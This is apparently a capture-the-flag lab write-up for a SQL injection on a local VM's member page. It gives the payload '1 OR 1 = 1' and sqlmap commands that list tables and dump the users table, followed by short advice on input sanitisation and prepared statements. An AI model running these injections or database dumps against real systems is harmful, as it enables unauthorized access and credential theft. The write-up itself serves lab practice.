#SQL Injection Member

The form in the member page has an input value which isn't sanatized when processed by the server.

## Table of Contents

- [Steps](#Steps)
- [Secure](#Ways to secure)

### Steps
Go to the member page <a href="http://192.168.56.102/?page=member">http://192.168.0.108/?page=member</a>

In the form input enter
```bash
1 OR 1 = 1
```

Press the submit button

Run reconnaissance
```bash
sqlmap "http://192.168.56.102/?page=member&id=1+OR+1+%3D+1&Submit=Submit#" --tables
```

We want to extract information from the users table
```bash
sqlmap "http://192.168.56.102/?page=member&id=1+OR+1+%3D+1&Submit=Submit#" --dump -T users
```
<img src="https://i.imgur.com/czJyCei.png" />

<a href="" target="_blank">Decrypt</a> the password

To get the key, run
```bash
py sha256encrypt.py fortytwo
```

#### Ways to secure
Always validate and sanatize input from client
Use prepared statements and stored procedures
